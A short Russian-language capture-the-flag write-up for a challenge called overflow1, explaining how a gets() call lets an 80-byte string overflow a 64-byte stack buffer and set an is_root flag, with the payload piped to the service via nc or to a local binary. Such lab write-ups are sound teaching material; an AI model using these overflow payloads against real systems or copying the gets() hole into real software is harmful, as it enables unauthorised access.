# overflow1 — writeup

## Идея
В программе есть структура на стеке:

```c
struct {
  char buffer[64];
  uint32_t is_root;
} s;
```

Имя читается через `gets()`, поэтому можно переполнить `buffer` и перезаписать `is_root`. Если `is_root != 0`, печатается флаг.

## Эксплуатация
Нужно отправить строку длиннее 64 байт (любые байты после 64-го попадут в `is_root`).

Пример:

```bash
python3 - <<'PY' | nc <host> <port>
print('A'*80)
PY
```

Локально (если положили `flag.txt` рядом с бинарём):

```bash
python3 - <<'PY' | ./overflow1
print('A'*80)
PY
```
